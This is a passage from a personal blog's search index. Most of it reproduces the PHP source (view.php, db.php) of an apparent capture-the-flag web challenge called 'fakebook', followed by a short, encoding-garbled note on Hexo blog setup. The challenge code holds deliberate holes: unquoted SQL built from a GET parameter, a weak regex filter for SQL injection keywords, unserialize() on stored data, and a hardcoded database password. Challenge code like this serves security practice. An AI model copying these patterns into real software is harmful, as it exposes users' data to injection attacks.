class="line">&#125;</span><br></pre></td></tr></table></figure><p>view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">session_start</span>(); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;db.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;user.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;error.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DB</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;ko&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span></span><br><span class="line">          content=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;User&lt;/title&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&#x27;bootstrap.php&#x27;</span>; <span class="meta">?&gt;</span></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$no</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;no&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">anti_sqli</span>(<span class="variable">$no</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no hack ~_~&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getUserByNo</span>(<span class="variable">$no</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="comment">//print_r($res);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">table</span> <span class="title">class</span>=&quot;<span class="title">table</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                <span class="title">username</span></span></span><br><span class="line"><span class="class">            &lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                <span class="title">age</span></span></span><br><span class="line"><span class="class">            &lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">                <span class="title">blog</span></span></span><br><span class="line"><span class="class">            &lt;/<span class="title">th</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">res</span>[&#x27;<span class="title">username</span>&#x27;]; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">user</span>-&gt;<span class="title">age</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">xss</span>($<span class="title">user</span>-&gt;<span class="title">blog</span>); ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;<span class="title">the</span> <span class="title">contents</span> <span class="title">of</span> <span class="title">his</span>/<span class="title">her</span> <span class="title">blog</span>&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    $<span class="title">response</span> = $<span class="title">user</span>-&gt;<span class="title">getBlogContents</span>();</span></span><br><span class="line"><span class="class">    <span class="title">if</span> ($<span class="title">response</span> === 404)</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;404 Not found&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$base64</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,<span class="subst">&#123;$base64&#125;</span>&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">// echo $response;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// var_dump($user-&gt;getBlogContents());</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>db.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;naiwjebfahjebfja&#x27;</span>, <span class="string">&#x27;fakebook&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// $mysqli = new mysqli(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;!@#1234!@#&#x27;, &#x27;fakebook&#x27;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidUsername</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>()) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">sha512</span>(<span class="variable">$passwd</span>);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27; and passwd = &#x27;<span class="subst">&#123;$passwd&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$username</span>, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">sha512</span>(<span class="variable">$passwd</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert into users (username, passwd, data) values (&#x27;<span class="subst">&#123;$username&#125;</span>&#x27;, &#x27;<span class="subst">&#123;$passwd&#125;</span>&#x27;, &#x27;<span class="subst">&#123;$data&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">real_query</span>(<span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllUsers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_all</span>(MYSQLI_ASSOC);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserByNo</span>(<span class="params"><span class="variable">$no</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">global</span> <span class="variable">$mysqli</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $no = addslashes($no);</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select * from users where no = <span class="subst">&#123;$no&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$res</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;[*] query error! (<span class="subst">&#123;$mysqli-&gt;error&#125;</span>)&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">anti_sqli</span>(<span class="params"><span class="variable">$no</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$patterns</span> = <span class="string">&quot;/union\Wselect|0x|hex/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$patterns</span>, <span class="variable">$no</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoæ­å»ºé‡åˆ°çš„å‘</title>
      <link href="/2017/07/13/Hexo%E6%90%AD%E5%BB%BA%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2017/07/13/Hexo%E6%90%AD%E5%BB%BA%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¸²æŸ“åå›¾ç‰‡è·¯å¾„ä¸æ­£ç¡®"><a href="#æ¸²æŸ“åå›¾ç‰‡è·¯å¾„ä¸æ­£ç¡®" class="headerlink" title="æ¸²æŸ“åå›¾ç‰‡è·¯å¾„ä¸æ­£ç¡®"></a>æ¸²æŸ“åå›¾ç‰‡è·¯å¾„ä¸æ­£ç¡®</h2><p>ä½¿ç”¨hexoæ­å»ºgithubåšå®¢ï¼Œä½¿ç”¨markdownæ ¼å¼çš„ç›¸å¯¹è·¯å¾„(![](img.jpg&#x2F;png))å¼•ç”¨å›¾ç‰‡ï¼Œç„¶è€Œhexo g åæ‰¾ä¸åˆ°å›¾ç‰‡ï¼Œæ¸²æŸ“åçš„å›¾ç‰‡è·¯å¾„ä¸ºï¼š<a href="http://localhost//img.jpg">http://localhost//img.jpg</a> </p><p>è§£å†³ï¼šhexo __config.yml ä¸­æ·»åŠ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br></pre></td></tr></table></figure><p>hexo s åï¼Œå›¾ç‰‡æ˜¯æ˜¾ç¤ºäº†ï¼Œä½†æ˜¯ä¸»é¢˜ç‰ˆå¼å¼€å§‹æ··ä¹±â€¦â€¦</p><h2 id="hexo-clean"><a href="#hexo-clean" class="headerlink" title="hexo clean"></a>hexo clean</h2><p>æ¯æ¬¡å¼€å¯hexoæ—¶ï¼Œä½¿ç”¨â€œhexo c &amp;&amp; hexo g &amp;&amp; hexo sâ€å‘½ä»¤ï¼Œä½†æ˜¯å®é™…ä¸Šhexo clean æ²¡æœ‰æ‰§è¡Œï¼ŒåŸæ¥çš„æ–‡ä»¶è¿˜å­˜åœ¨ï¼Œå¯¼è‡´æ¸²æŸ“åæ‰¾ä¸åˆ°æ­£ç¡®çš„æ–‡ä»¶æˆ–ä¾æ—§ä¿ç•™åŸæ–‡ä»¶å†…å®¹ï¼Œé‡æ–°æ‰§è¡Œâ€œhexo clean &amp;&amp; hexo g &amp;&amp; hexo sâ€ ä¸»é¢˜ç‰ˆå¼æ¢å¤æ­£å¸¸</p><h2 id="hexo-deploy"><a href="#hexo-deploy" class="headerlink" title="hexo deploy"></a>hexo deploy</h2><p>2022å¹´éƒ¨ç½²hexo åˆ°githubæ—¶ï¼Œgithubè¦æ±‚çš„éƒ¨ç½²å¯†ç æ˜¯â€œpersonal access tokensâ€ï¼Œè€Œä¸æ˜¯ç™»å½•githubçš„mm</p>]]></content>
      
      
      
        <tags>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
